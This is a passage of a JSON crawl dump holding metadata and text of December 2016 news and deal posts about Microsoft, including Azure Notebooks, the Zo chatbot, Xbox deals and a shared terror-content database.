      "url": "http://omgili.com/ri/.wHSUbtEfZRJcZIzEkwz53VfIySkCw1wljjfqbcCpL1O0ezrZmQ06_VFFjmbKqOIQbdOlCIDeHLwt8OTHP19Vtbcg_A9qPNkFokeB35vc_lgRx4L7zE7qA--",
      "ord_in_thread": 0,
      "author": "Pradeep",
      "published": "2016-12-06T14:47:54.877+02:00",
      "title": "Microsoft announces support for F# language in Azure Notebooks",
      "text": "\nAzure Notebooks are a toolchain that allows you to create and share documents that contain live code, equations, visualizations, and explanatory text. Azure Notebooks offer free-for-use execution of notebook content, access to high-performance data center resources, and allow you to share your notebooks with others with a single link. So for, the free Azure Notebooks service has supported R and Python. Yesterday, Microsoft announced the availability of preview support for the F# language to match the Visual Studio Data Science workload.\nIntroducing F# and Azure Notebooks Click the notebook Sign in with your Microsoft account (Outlook/Hotmail/Xbox/…) Click the Open in Jupyter button Run the whole notebook with “Cell | Run All” or Run one cell at a time using Shift-Enter Read more about it here .\n",
      "highlightText": "",
      "highlightTitle": "",
      "language": "english",
      "external_links": [],
      "entities": {
        "persons": [
          {
            "name": "python",
            "sentiment": "none"
          }
        ],
        "organizations": [
          {
            "name": "microsoft",
            "sentiment": "neutral"
          },
          {
            "name": "azure notebooks  azure notebooks",
            "sentiment": "neutral"
          },
          {
            "name": "azure notebooks",
            "sentiment": "none"
          },
          {
            "name": "visual studio data science",
            "sentiment": "none"
          }
        ],
        "locations": [
          {
            "name": "jupyter",
            "sentiment": "none"
          }
        ]
      },
      "crawled": "2016-12-06T14:47:54.877+02:00"
    },
    {
      "thread": {
        "uuid": "679aeaa03d7badff0c62010c11a236cb3cc84dad",
        "url": "http://omgili.com/ri/jHIAmI4hxg9BcPFu_4VOJxXOPE7_XaSqHHmPvWoFDz9eYQTio3NGKy.rRiwOxXtE_YMpYYuyFU0WWiI4IxF18EbWo6.ro34d8qpk67QKcfTug9GkcvmnWWfBXbgTOtD7",
        "site_full": "www.onenewspage.com",
        "site": "onenewspage.com",
        "site_section": "http://www.onenewspage.com/rss/latest/Technology.rss",
        "site_categories": [
          "news",
          "entertainment",
          "education"
        ],
        "section_title": "Latest Technology News on One News Page",
        "title": "Home Hub, Microsoft’s answer to Alexa and Google Home, could be PC-driven",
        "title_full": "Home Hub, Microsoft’s answer to Alexa and Google Home, could be PC-driven - One News Page",
        "published": "2016-12-06T14:52:18.019+02:00",
        "replies_count": 0,
        "participants_count": 1,
        "site_type": "news",
        "country": "US",
        "spam_score": 0.0,
        "main_image": "http://cdn.newsserve.net/ONPglobe128.png",
        "performance_score": 0,
        "domain_rank": 91686,
        "social": {
          "facebook": {
            "likes": 0,
            "comments": 0,
            "shares": 0
          },
          "gplus": {
            "shares": 0
          },
          "pinterest": {
            "shares": 0
          },
          "linkedin": {
            "shares": 0
          },
          "stumbledupon": {
            "shares": 0
          },
          "vk": {
            "shares": 0
          }
        }
      },
      "uuid": "679aeaa03d7badff0c62010c11a236cb3cc84dad",
      "url": "http://omgili.com/ri/jHIAmI4hxg9BcPFu_4VOJxXOPE7_XaSqHHmPvWoFDz9eYQTio3NGKy.rRiwOxXtE_YMpYYuyFU0WWiI4IxF18EbWo6.ro34d8qpk67QKcfTug9GkcvmnWWfBXbgTOtD7",
      "ord_in_thread": 0,
      "author": "onenewspage.com",
      "published": "2016-12-06T14:52:18.019+02:00",
      "title": "Home Hub, Microsoft’s answer to Alexa and Google Home, could be PC-driven",
      "text": "Recent information suggests that, while Microsoft does indeed have plans for a \"Home Hub\" product to compete with Amazon Alexa and Google Home, it might be entirely PC-based, as opposed to a stand-alone device.",
      "highlightText": "",
      "highlightTitle": "",
      "language": "english",
      "external_links": [],
      "entities": {
        "persons": [
          {
            "name": "alexa",
            "sentiment": "neutral"
          }
        ],
        "organizations": [
          {
            "name": "home hub",
            "sentiment": "neutral"
          },
          {
            "name": "google home",
            "sentiment": "neutral"
          },
          {
            "name": "microsoft",
            "sentiment": "neutral"
          },
          {
            "name": "amazon alexa",
            "sentiment": "none"
          }
        ],
        "locations": []
      },
      "crawled": "2016-12-06T14:52:18.019+02:00"
    },
    {
      "thread": {
        "uuid": "ea9d44b42c83860a9bbfcf7e733707b4d31383bf",
        "url": "http://omgili.com/ri/.wHSUbtEfZTpAYNeM5CifTfjdeUT710WqmQXjsjcvrLM7GSVNZtGhbnzmSB9TdbYgibVKrzm9mqO9D9F2GEieCoYB00hBKiMJvhO_6LuN6QBwk0E7EOp6M0sAHMAMN6q9Ewg4LIbO5UL32InUJtzA2KJymcdWgs4U3wLN3CEZP4kI6Ql__YjPA9Ivr.w2bO9Doe0MAqPpPZcJtMtAkQ6Gr4KZ_upnhODs.r24CIdUudVuMTzfr.Zbu8Mdt642VSZDNOi71_X9chrN.d8Zq7F.QHOSwi65lnA4cOv9Bf2I1eaTUoOnQAvTqglZFfYhaqVN3LmoWcHmkE-",
        "site_full": "slickdeals.net",
        "site": "slickdeals.net",
        "site_section": "https://slickdeals.net/deals/",
        "site_categories": [
          "shopping"
        ],
        "section_title": "Slickdeals Popular Deals RSS Feed",
        "title": "Digital Deals: EA Access 12-Month Subscription for $24.99 AC, Microsoft Xbox Live 24-Month Gold Membership for $80.00 AC, Kohl's $100 Gift Card for $95.00 AC @ Newegg.com",
        "title_full": "Digital Deals: EA Access 12-Month Subscription for $24.99 AC, Microsoft Xbox Live 24-Month Gold Membership for $80.00 AC, Kohl's $100 Gift Card for $95.00 AC @ Newegg.com",
        "published": "2016-12-06T15:04:53.855+02:00",
        "replies_count": 0,
        "participants_count": 1,
        "site_type": "blogs",
        "country": "US",
        "spam_score": 0.0,
        "main_image": null,
        "performance_score": 0,
        "domain_rank": 269,
        "social": {
          "facebook": {
            "likes": 0,
            "comments": 0,
            "shares": 0
          },
          "gplus": {
            "shares": 0
          },
          "pinterest": {
            "shares": 0
          },
          "linkedin": {
            "shares": 0
          },
          "stumbledupon": {
            "shares": 0
          },
          "vk": {
            "shares": 0
          }
        }
      },
      "uuid": "ea9d44b42c83860a9bbfcf7e733707b4d31383bf",
      "url": "http://omgili.com/ri/.wHSUbtEfZTpAYNeM5CifTfjdeUT710WqmQXjsjcvrLM7GSVNZtGhbnzmSB9TdbYgibVKrzm9mqO9D9F2GEieCoYB00hBKiMJvhO_6LuN6QBwk0E7EOp6M0sAHMAMN6q9Ewg4LIbO5UL32InUJtzA2KJymcdWgs4U3wLN3CEZP4kI6Ql__YjPA9Ivr.w2bO9Doe0MAqPpPZcJtMtAkQ6Gr4KZ_upnhODs.r24CIdUudVuMTzfr.Zbu8Mdt642VSZDNOi71_X9chrN.d8Zq7F.QHOSwi65lnA4cOv9Bf2I1eaTUoOnQAvTqglZFfYhaqVN3LmoWcHmkE-",
      "ord_in_thread": 0,
      "author": "TDMVP73",
      "published": "2016-12-06T15:04:53.855+02:00",
      "title": "Digital Deals: EA Access 12-Month Subscription for $24.99 AC, Microsoft Xbox Live 24-Month Gold Membership for $80.00 AC, Kohl's $100 Gift Card for $95.00 AC @ Newegg.com",
      "text": "\nThumb Score: +5 Hey guys,\n\nI didn't see this posted, so I thought I'd share.\n\nGaming Subscriptions: EA Access 12-Month Subscription (Xbox One Digital Code) [ newegg.com ] Apply Code: EMCFGEK23 at checkout. Price (after coupon): $24.99 Limit 3 Per Customer [LIST][*] Microsoft Xbox Live 24-Month Gold Membership (Digital Code) [ newegg.com ] ",
      "highlightText": "",
      "highlightTitle": "",
      "language": "english",
      "external_links": [],
      "entities": {
        "persons": [
          {
            "name": "kohl",
            "sentiment": "neutral"
          }
        ],
        "organizations": [
          {
            "name": "ac",
            "sentiment": "neutral"
          },
          {
            "name": "microsoft",
            "sentiment": "neutral"
          }
        ],
        "locations": []
      },
      "crawled": "2016-12-06T15:04:53.855+02:00"
    },
    {
      "thread": {
        "uuid": "a8a34f8ef6577d7756a40f84e7c099cfc556904b",
        "url": "http://omgili.com/ri/jHIAmI4hxg9fSpdTq1n.MGgwGnmQspjrY4L.591fP3fJ9Q3np6ZHYa9.QOJe4CdMyOiACCjxQ0DQlfZWZWU57A--",
        "site_full": "www.arcamax.com",
        "site": "arcamax.com",
        "site_section": "http://www.arcamax.com/business/",
        "site_categories": [
          "entertainment"
        ],
        "section_title": "Business | ArcaMax Publishing",
        "title": "Microsoft introduces chatbot named Zo after Tay went awry",
        "title_full": "Microsoft introduces chatbot named Zo after Tay went awry | Business News | ArcaMax Publishing",
        "published": "2016-12-05T02:00:00.000+02:00",
        "replies_count": 0,
        "participants_count": 1,
        "site_type": "news",
        "country": "US",
        "spam_score": 0.001,
        "main_image": "http://www.arcamax.com/arcamax-200-icon.png",
        "performance_score": 0,
        "domain_rank": 14111,
        "social": {
          "facebook": {
            "likes": 0,
            "comments": 0,
            "shares": 0
          },
          "gplus": {
            "shares": 0
          },
          "pinterest": {
            "shares": 0
          },
          "linkedin": {
            "shares": 0
          },
          "stumbledupon": {
            "shares": 0
          },
          "vk": {
            "shares": 0
          }
        }
      },
      "uuid": "a8a34f8ef6577d7756a40f84e7c099cfc556904b",
      "url": "http://omgili.com/ri/jHIAmI4hxg9fSpdTq1n.MGgwGnmQspjrY4L.591fP3fJ9Q3np6ZHYa9.QOJe4CdMyOiACCjxQ0DQlfZWZWU57A--",
      "ord_in_thread": 0,
      "author": "arcamax.com",
      "published": "2016-12-05T02:00:00.000+02:00",
      "title": "Microsoft introduces chatbot named Zo after Tay went awry",
      "text": "Microsoft is taking another stab at building a chatbot, several months after Tay, an earlier attempt, was taken offline when some internet users made it spout racist and sexist comments.\nThe company's second try, Zo, lives on the Kik messaging application.\nSpotted over the weekend by a Microsoft-tracking blog, Zo appears to avoid discussion of politics, religion and race entirely. It also has a narrower release than Tay, which, because of its place on the public Twitter platform, melted down in view of the entire internet.\nMicrosoft launched Tay, a millennial-imitating chatbot, in March. The bot, powered by machine learning algorithms, was designed to mine public data and the input of people who engaged with it on Twitter, Kik and GroupMe, to come up with phrases to use in conversation.\nA day later, the bot was advocating genocide and calling for the murder of feminists.\nMicrosoft took Tay down and said it would make adjustments. The company said the bot was the victim of a coordinated attack by internet users interested in manipulating its responses.\nMicrosoft and other technology companies have bet on chatbot interaction -- and the artificial intelligence-imitating tools that underpin them -- as one of the next computing interfaces.\nThe company's experiments with a chatbot in the U.S. follow the success Microsoft had with Xiaoice, a chatbot the company introduced in China in 2014.\nXiaoice itself has quirks that would raise eyebrows in the U.S. China Digital Times reported last month that Microsoft had apparently programmed the bot to avoid discussing the government's crackdown on the 1989 Tiananmen Square protests.\nBeijing heavily censors China's internet, including chat and news sources. It blocks entire websites, including Facebook.\n(c)2016 The Seattle Times\nVisit The Seattle Times at www.seattletimes.com\n ",
      "highlightText": "",
      "highlightTitle": "",
      "language": "english",
      "external_links": [
        "https://plus.google.com/share?url=http://www.arcamax.com/business/businessnews/s-1901591",
        "http://twitter.com/share?url=http://www.arcamax.com/business/businessnews/s-1901591&hashtags=ArcaMax"
      ],
      "entities": {
        "persons": [
          {
            "name": "tay",
            "sentiment": "neutral"
          },
          {
            "name": "xiaoice",
            "sentiment": "none"
          }
        ],
        "organizations": [
          {
            "name": "microsoft",
            "sentiment": "neutral"
          },
          {
            "name": "u.s. china digital times",
            "sentiment": "none"
          },
          {
            "name": "kik",
            "sentiment": "none"
          },
          {
            "name": "facebook",
            "sentiment": "none"
          },
          {
            "name": "seattle times visit the seattle times",
            "sentiment": "none"
          }
        ],
        "locations": [
          {
            "name": "u.s.",
            "sentiment": "none"
          },
          {
            "name": "tiananmen square",
            "sentiment": "none"
          },
          {
            "name": "beijing",
            "sentiment": "none"
          },
          {
            "name": "china",
            "sentiment": "none"
          }
        ]
      },
      "crawled": "2016-12-06T15:27:03.985+02:00"
    },
    {
      "thread": {
        "uuid": "7ef6a1a2681962ef0232d7af096c7236090a4080",
        "url": "http://omgili.com/ri/.wHSUbtEfZSCskm_gl44z3dUWwsHwOXTAfFo12LUQPt8Ersw.NBrCo2oG.cgGjqr0LQ_EsqqntD9AO0jMIOLlJRl_9jACdRST2DjtZYlY0ko21WnMw_k5iRTP8nx.B5rlBhTlrTUK5eVATQIUWWmXSk7alLAD94Z0dJONmjoookuYumRVtk0WDld0FGMB3KzStw3TbUJZTpFIHdeiUqk0zXjo20AzIBKYfgDSX_7sXiyOgbV0I1v.B.bHwTwJxWtT3sNAl9hT2g-",
        "site_full": "www.dealighted.com",
        "site": "dealighted.com",
        "site_section": "http://feeds.feedburner.com/dealighted",
        "site_categories": [
          "shopping"
        ],
        "section_title": "Dealighted.com Top User Posted Deals",
        "title": "Digital Deals: EA Access 12-Month Subscription for $24.99 AC, Microsoft Xbox Live 24-Month Gold Membership for $80.00 AC, Kohl's $100 Gift Card for $95.00 AC @ Newegg.com",
        "title_full": "Digital Deals: EA Access 12-Month Subscription for $24.99 AC, Microsoft Xbox Live 24-Month Gold Membership for $80.00 AC, Kohl's $100 Gift Card for $95.00 AC @ Newegg.com",
        "published": "2016-12-06T15:30:40.628+02:00",
        "replies_count": 0,
        "participants_count": 0,
        "site_type": "news",
        "country": "US",
        "spam_score": 0.0,
        "main_image": "",
        "performance_score": 0,
        "domain_rank": 68695,
        "social": {
          "facebook": {
            "likes": 0,
            "comments": 0,
            "shares": 0
          },
          "gplus": {
            "shares": 0
          },
          "pinterest": {
            "shares": 0
          },
          "linkedin": {
            "shares": 0
          },
          "stumbledupon": {
            "shares": 0
          },
          "vk": {
            "shares": 0
          }
        }
      },
      "uuid": "7ef6a1a2681962ef0232d7af096c7236090a4080",
      "url": "http://omgili.com/ri/.wHSUbtEfZSCskm_gl44z3dUWwsHwOXTAfFo12LUQPt8Ersw.NBrCo2oG.cgGjqr0LQ_EsqqntD9AO0jMIOLlJRl_9jACdRST2DjtZYlY0ko21WnMw_k5iRTP8nx.B5rlBhTlrTUK5eVATQIUWWmXSk7alLAD94Z0dJONmjoookuYumRVtk0WDld0FGMB3KzStw3TbUJZTpFIHdeiUqk0zXjo20AzIBKYfgDSX_7sXiyOgbV0I1v.B.bHwTwJxWtT3sNAl9hT2g-",
      "ord_in_thread": 0,
      "author": "",
      "published": "2016-12-06T15:30:40.628+02:00",
      "title": "Digital Deals: EA Access 12-Month Subscription for $24.99 AC, Microsoft Xbox Live 24-Month Gold Membership for $80.00 AC, Kohl's $100 Gift Card for $95.00 AC @ Newegg.com",
      "text": "More Deals & Coupons Like \"Digital Deals: EA Access 12-Month Subscription for .99 AC, Microsoft Xbox Live 24-Month Gold Membership for .00 AC, Kohl's 0 Gift Card for .00 AC @ Newegg.com\" \n25 Nov, 9:22 am Coupon by vannat \n24 Nov, 8:37 am Coupon by shronik \n27 Nov, 7:44 pm",
      "highlightText": "",
      "highlightTitle": "",
      "language": "english",
      "external_links": [],
      "entities": {
        "persons": [
          {
            "name": "kohl",
            "sentiment": "neutral"
          }
        ],
        "organizations": [
          {
            "name": "ac",
            "sentiment": "neutral"
          },
          {
            "name": "microsoft",
            "sentiment": "neutral"
          }
        ],
        "locations": []
      },
      "crawled": "2016-12-06T15:30:40.628+02:00"
    },
    {
      "thread": {
        "uuid": "ed01de537726659e5aad5cebebb478029f317f86",
        "url": "http://omgili.com/ri/.wHSUbtEfZSJlbPFf2vcZQ7DQwnenE_nO.wz1QD3H3.ZUoplr1KHnow6RoYc86h.eSjGUQEGjaGxh4018EFlHARq1zSZ7oR8aaK_wVn0TlM2tGY_EKFiMDTf1YKi5UPHHBgpp9RxYlvUlqwcJSkdv4i1p5W7cITRrWrsdYsEqJw-",
        "site_full": "www.theguardian.com",
        "site": "theguardian.com",
        "site_section": "",
        "site_categories": [
          "news",
          "education"
        ],
        "section_title": "",
        "title": "Why does Bill Gates want you to read The Myth of the Strong Leader? | Technology | The Guardian",
        "title_full": "Why does Bill Gates want you to read The Myth of the Strong Leader? | Technology | The Guardian",
        "published": "2016-12-06T17:16:24.465+02:00",
        "replies_count": 0,
        "participants_count": 0,
        "site_type": "news",
        "country": "US",
        "spam_score": 0.171,
        "main_image": "https://i.guim.co.uk/img/media/6bd2adf736942fbf4343e2aa9f5430cd392cfa79/0_0_3000_1800/master/3000.jpg?w=1200&amp;h=630&amp;q=55&amp;auto=format&amp;usm=12&amp;fit=crop&amp;crop=faces,entropy&amp;bm=normal&amp;ba=bottom%2Cleft&amp;blend64=aHR0cHM6Ly91cGxvYWRzLmd1aW0uY28udWsvMjAxNi8wNS8yNS9vdmVybGF5LWxvZ28tMTIwMC05MF9vcHQucG5n&amp;s=263722cd6009bb9d0cb0dd11bca1f7ac",
        "performance_score": 1,
        "domain_rank": 170,
        "social": {
          "facebook": {
            "likes": 158,
            "comments": 0,
            "shares": 158
          },
          "gplus": {
            "shares": 4
          },
          "pinterest": {
            "shares": 1
          },
          "linkedin": {
            "shares": 7
          },
          "stumbledupon": {
            "shares": 0
          },
          "vk": {
            "shares": 0
          }
        }
      },
      "uuid": "ed01de537726659e5aad5cebebb478029f317f86",
      "url": "http://omgili.com/ri/.wHSUbtEfZSJlbPFf2vcZQ7DQwnenE_nO.wz1QD3H3.ZUoplr1KHnow6RoYc86h.eSjGUQEGjaGxh4018EFlHARq1zSZ7oR8aaK_wVn0TlM2tGY_EKFiMDTf1YKi5UPHHBgpp9RxYlvUlqwcJSkdv4i1p5W7cITRrWrsdYsEqJw-",
      "ord_in_thread": 0,
      "author": "Simon Usborne",
      "published": "2016-12-06T17:16:24.465+02:00",
      "title": "Why does Bill Gates want you to read The Myth of the Strong Leader? | Technology | The Guardian",
      "text": "Shortcuts Why does Bill Gates want you to read The Myth of the Strong Leader? \nThe Microsoft billionaire’s annual reading list includes a 2014 study by British political scholar Archie Brown – a choice, he says, was inspired by the US election In his review of Archie Brown’s The Myth of the Strong Leader, Bill Gates studiously avoids using the T-word. Photograph: Ida Mae Astute/Getty Images Tuesday 6 December 2016 15.11 GMT View more sharing options Share on Messenger Close \nI f there’s one thing more valuable to an author than a Richard and Judy endorsement circa 2006, it’s a Bill Gates plug circa this week. The man has reach, and the luxury of reading time that comes with being a semi-retired billionaire. And he has weight. So, while four of the books on his annual list cover predictable if fascinating ground ( genetics , tennis , electricity infrastructure and a business memoir ), the fifth is quite interesting, not to say timely. \nIn The Myth of the Strong Leader , the renowned British political scholar Archie Brown throws a dozen world leaders of the past century into a bag, shakes them up, and watches the nice guys rise to the top. Brown debunks the idea that the most successful leaders are those who dominate and mould their nations around themselves, as far as their political systems allow. “A more collegial style of leadership is too often characterised as a weakness,” he writes. \nGates says on his blog that this year’s US election prompted him to pick up the book, which was published in 2014. Brown, emeritus professor of politics at Oxford University, “could not have predicted how resonant his book would become in 2016”, he adds. However, in a separate review on his website , Gates studiously avoids the T-word. He comes closest, perhaps, when he says that the ostensibly appealing qualities of “strong” leaders “can be boiled down to a belief [that he or she] is the only one who knows what the country needs, and the only one who can deliver it”. \nBrown, who is 77, is understandably delighted by Gates’s approval, and doesn’t mind alluding to Trump. “The myth of the strong leader is alive and well,” he says in an email. “It was a major factor in bringing us the looming reality of the presidency of a TV star. So I believe that the arguments I make in The Myth of the Strong Leader do, as Gates suggests, have a particular resonance right now.” \nGates starts his review with the case of the former Spanish prime minister Adolfo Suárez. The rightwing minister under Franco reached out to the left to form a centrist, democratic government after the dictator’s demise with “negotiation, persuasion, and some very adroit coalition-building”. Of US leaders, Brown – and Gates – big up Harry Truman, who once said: “I sit here all day trying to persuade people to do the things they ought to do without my persuading them ... That’s all the powers of the president amount to.” \nPutin is the biggest reigning strongman in Brown’s book, but the writer is reluctant to assess his growing popularity among rightwing figures including Trump, Nigel Farage and Marine Le Pen. It’s also too soon to judge Trump, he says. But perhaps we can be premature, and do it anyway, using Brown’s own list of the qualities that, he says, make a truly strong president: “Integrity, intelligence, articulateness, collegiality, shrewd judgment, a questioning mind, willingness to seek disparate views, ability to absorb information, flexibility, good memory, courage, vision, empathy and boundless energy.” How’s he doing so far? ",
      "highlightText": "",
      "highlightTitle": "",
      "language": "english",
      "external_links": [],
      "entities": {
        "persons": [
          {
            "name": "bill gates",
            "sentiment": "negative"
          },
          {
            "name": "adolfo suárez",
            "sentiment": "none"
          },
          {
            "name": "trump",
            "sentiment": "none"
          },
          {
            "name": "putin",
            "sentiment": "none"
          },
          {
            "name": "judy",
            "sentiment": "none"
          },
          {
            "name": "franco",
            "sentiment": "none"
          },
          {
            "name": "gates",
            "sentiment": "none"
          },
          {
            "name": "nigel farage",
            "sentiment": "none"
          },
          {
            "name": "le pen",
            "sentiment": "none"
          },
          {
            "name": "richard",
            "sentiment": "none"
          },
          {
            "name": "brown",
            "sentiment": "none"
          },
          {
            "name": "ida mae",
            "sentiment": "none"
          },
          {
            "name": "archie brown",
            "sentiment": "none"
          },
          {
            "name": "harry truman",
            "sentiment": "none"
          }
        ],
        "organizations": [
          {
            "name": "microsoft",
            "sentiment": "neutral"
          },
          {
            "name": "oxford university",
            "sentiment": "none"
          }
        ],
        "locations": [
          {
            "name": "us",
            "sentiment": "none"
          }
        ]
      },
      "crawled": "2016-12-06T17:16:24.465+02:00"
    },
    {
      "thread": {
        "uuid": "d819b0cde3263b924d81d84be5fa806ea52aa7d2",
        "url": "http://omgili.com/ri/jHIAmI4hxg.eJXK_yAdfkadTZr6k13Qfg26C.VfP1BBMkeRgLberyfdhUDV23aleOvWJqcgiQRia3vAmxbsVnt3hO18JiG0.V.a4yEDpwzL5lQjXK_cOyjbOf2fa6IQP",
        "site_full": "www.washingtontimes.com",
        "site": "washingtontimes.com",
        "site_section": "http://feeds.feedburner.com/Front-TheWashingtonTimesAmericasNewspaper",
        "site_categories": [
          "news"
        ],
        "section_title": "www.washingtontimes.com stories: National",
        "title": "Facebook, Twitter, Microsoft, YouTube team up for terror database",
        "title_full": "Facebook, Twitter, Microsoft, YouTube team up for terror database",
        "published": "2016-12-06T20:06:54.504+02:00",
        "replies_count": 0,
        "participants_count": 1,
        "site_type": "news",
        "country": "US",
        "spam_score": 0.0,
        "main_image": "http://media.washtimes.com.s3.amazonaws.com/media/image/2016/08/18/twitter_extremist_suspensions.jpeg",
        "performance_score": 0,
        "domain_rank": 3106,
        "social": {
          "facebook": {
            "likes": 3,
            "comments": 0,
            "shares": 3
          },
          "gplus": {
            "shares": 0
          },
          "pinterest": {
            "shares": 0
          },
          "linkedin": {
            "shares": 0
          },
          "stumbledupon": {
            "shares": 0
          },
          "vk": {
            "shares": 0
          }
        }
      },
      "uuid": "d819b0cde3263b924d81d84be5fa806ea52aa7d2",
      "url": "http://omgili.com/ri/jHIAmI4hxg.eJXK_yAdfkadTZr6k13Qfg26C.VfP1BBMkeRgLberyfdhUDV23aleOvWJqcgiQRia3vAmxbsVnt3hO18JiG0.V.a4yEDpwzL5lQjXK_cOyjbOf2fa6IQP",
      "ord_in_thread": 0,
      "author": "Andrea Noble",
      "published": "2016-12-06T20:06:54.504+02:00",
      "title": "Facebook, Twitter, Microsoft, YouTube team up for terror database",
      "text": "  Andrea Noble   \nFour of the biggest technology and social media companies in the U.S. are building a database of terrorism-related photos and videos in an effort to crack down on propaganda and recruitment efforts shared through online platforms. \nFacebook, Microsoft, Twitter and YouTube announced this week they are collaborating to share the unique digital “fingerprints” associated with terrorist-related images that each company has removed from their services. By sharing the information, they hope to give other social media companies a way to efficiently search for the same data on their own platforms and remove the content as needed. \n“There is no place for content that promotes terrorism on our hosted consumer services,” the companies said in a joint statement issued Monday. \nNo personally identifiable information will be shared through the database and content flagged by one company will not automatically be removed from another without first being reviewed, the companies said. But it will give companies a leg up in identifying violent imagery and propaganda that violates their own standards of use. \nThe agreement comes as social media companies have faced increased criticism over a failure to adequately address harassment, hate speech, and terrorism-related messages on their platforms. \nEarlier this week, the European Commission criticized social media companies for their slow response to messages that promote radicalization or hate speech. \nThe Financial Times reported that the commission found that just 40 percent of reports of illegal hate speech were reviewed and within 24 hours. About 80 percent of the cases were reviewed within 48 hours, but commissioners were unimpressed. \n“If Facebook, YouTube, Twitter and Microsoft want to convince me and the ministers that the non-legislative approach can work, they will have to act quickly and make a strong effort in the coming months,” Věra Jourová, EU justice commissioner, told the Financial Times. “The last weeks and months have shown that social media companies need to live up to their important role and take up their share of responsibility when it comes to phenomena like online radicalization, illegal hate speech or fake news.”",
      "highlightText": "",
      "highlightTitle": "",
      "language": "english",
      "external_links": [],
      "entities": {
        "persons": [
          {
            "name": "andrea noble    four",
            "sentiment": "neutral"
          },
          {
            "name": "věra jourová",
            "sentiment": "none"
          }
        ],
        "organizations": [
          {
            "name": "facebook",
            "sentiment": "neutral"
          },
          {
            "name": "youtube",
            "sentiment": "neutral"
          },
          {
            "name": "microsoft",
            "sentiment": "neutral"
          },
          {
            "name": "financial times",
            "sentiment": "none"
          },
          {
            "name": "european commission",
            "sentiment": "none"
          }
        ],
        "locations": [
          {
            "name": "u.s.",
            "sentiment": "none"
          },
          {
            "name": "eu",
            "sentiment": "none"
          }
        ]
      },
      "crawled": "2016-12-06T20:06:54.504+02:00"
    },
    {
      "thread": {
        "uuid": "6300ef797fe518ea1e37606d893449fe610a5166",
        "url": "http://omgili.com/ri/jHIAmI4hxg8Dz0oGWW1_sGVZrduq_.2LK5ZvFxiAkC857d2Tt_6PHg2KSn_JFeqZanCCExSGz1hNmwYeF8LQKNa5diyxhPx0GsvIC93aBbs.OjfDM8BRSBbJl8v1v_1Xah6j2L2LROM-",
        "site_full": "www.windowscentral.com",
        "site": "windowscentral.com",
        "site_section": "http://www.windowscentral.com/",
        "site_categories": [
          "news",
          "tech"
        ],
        "section_title": "Windows Central - News, Forums, Reviews, Help for Windows Phone",
        "title": "Microsoft talks enterprise features coming in Windows 10 Creators Update",
        "title_full": "Microsoft talks enterprise features coming in Windows 10 Creators Update",
        "published": "2016-12-06T20:34:15.910+02:00",
        "replies_count": 0,
        "participants_count": 1,
        "site_type": "blogs",
        "country": "US",
        "spam_score": 0.0,
        "main_image": null,
        "performance_score": 0,
        "domain_rank": 3278,
        "social": {
          "facebook": {
            "likes": 11,
            "comments": 0,
            "shares": 11
          },
          "gplus": {
            "shares": 0
          },
          "pinterest": {
            "shares": 0
          },
          "linkedin": {
            "shares": 0
          },
          "stumbledupon": {
            "shares": 0
          },
          "vk": {
            "shares": 0
          }
        }
      },
      "uuid": "6300ef797fe518ea1e37606d893449fe610a5166",
      "url": "http://omgili.com/ri/jHIAmI4hxg8Dz0oGWW1_sGVZrduq_.2LK5ZvFxiAkC857d2Tt_6PHg2KSn_JFeqZanCCExSGz1hNmwYeF8LQKNa5diyxhPx0GsvIC93aBbs.OjfDM8BRSBbJl8v1v_1Xah6j2L2LROM-",
      "ord_in_thread": 0,
      "author": "Dan Thorp-Lancaster",
      "published": "2016-12-06T20:34:15.910+02:00",
      "title": "Microsoft talks enterprise features coming in Windows 10 Creators Update",
      "text": "\nWhile Microsoft has mostly on creative consumer-focused features coming in the Windows 10 Creators Update thus far, the company has taken to a new blog post to detail aspects of the update that should appeal to business users. ",
      "highlightText": "",
      "highlightTitle": "",
      "language": "english",
      "external_links": [],
      "entities": {
        "persons": [],
        "organizations": [
          {
            "name": "microsoft",
            "sentiment": "neutral"
          }
        ],
        "locations": []
      },
      "crawled": "2016-12-06T20:34:15.910+02:00"
    },
    {
      "thread": {
        "uuid": "070f7f10c1a3dd5672980a0ada1ae53a7f4a8cd4",
        "url": "http://omgili.com/ri/rPCDLkAl21Q5cMjj.dx.NfSd6H0Ozthqzs220AORtCDHrzB7MAq8tA3SNdEZoipomTGlWxYRGeeGNnZmkGiq8GoZgV9vWGn8",
        "site_full": "adsoftheworld.com",
        "site": "adsoftheworld.com",
        "site_section": "http://adsoftheworld.com//cards?terms=&created=all&medium=All&industry=All&country=473&sort_by=created",
        "site_categories": [
          "business"
        ],
        "section_title": "Latest Ads | Ads of the World™",
        "title": "Microsoft: Spirit of the season",
        "title_full": "Microsoft: Spirit of the season | Ads of the World™",
        "published": "2016-12-06T02:00:00.000+02:00",
        "replies_count": 0,
        "participants_count": 1,
        "site_type": "blogs",
        "country": "US",
        "spam_score": 0.0,
        "main_image": "https://aotw-pd.s3.amazonaws.com/media-youtube/OpBRZGuXGX0.jpg",
        "performance_score": 0,
        "domain_rank": 21171,
        "social": {
          "facebook": {
            "likes": 0,
            "comments": 0,
            "shares": 0
          },
          "gplus": {
            "shares": 0
          },
          "pinterest": {
            "shares": 0
          },
          "linkedin": {
            "shares": 0
          },
          "stumbledupon": {
            "shares": 0
          },
          "vk": {
            "shares": 0
          }
        }
      },
      "uuid": "070f7f10c1a3dd5672980a0ada1ae53a7f4a8cd4",
      "url": "http://omgili.com/ri/rPCDLkAl21Q5cMjj.dx.NfSd6H0Ozthqzs220AORtCDHrzB7MAq8tA3SNdEZoipomTGlWxYRGeeGNnZmkGiq8GoZgV9vWGn8",
      "ord_in_thread": 0,
      "author": "adsoftheworld.com",
      "published": "2016-12-06T02:00:00.000+02:00",
      "title": "Microsoft: Spirit of the season",
      "text": " McCann, New York, USA Chief Creative Officers: Sean Bryan , Tom Murphy Executive Creative Directors: Daniela Vojta , Susan Young , Jim Hord Creative Director: Daniel Kim , Todd Brown , Chris McMurtrey , Scott Higgins , Roberto Baibich Associate Creative Directors: Nick Ciomperlik , Susann Goerg Copywriter: David Cappolino Art Directors: Julie Koong , Alicia Foor Director of Creative Technology: David Cliff Director of Integrated Production: Aaron Kovan Director of Interactive Production: Jeremy Adirim Senior Producers: Melissa Tifrere , Mel Senecal Producer: Rebecca Magner Interactive Producer: Charlotte Popper Executive Integrated Music Producer: Eric Johnson Music Coordinator : Sam Belkin Production Company: RSA Films Director: Jake Scott Producer: David Mitchell Director of Photography: Chris Soos 1st A.D.: Howell Caldwell Line Producer: Jason Groves",
      "highlightText": "",
      "highlightTitle": "",
      "language": "english",
      "external_links": [
        "http://mccann.com/m:united//"
      ],
      "entities": {
        "persons": [
          {
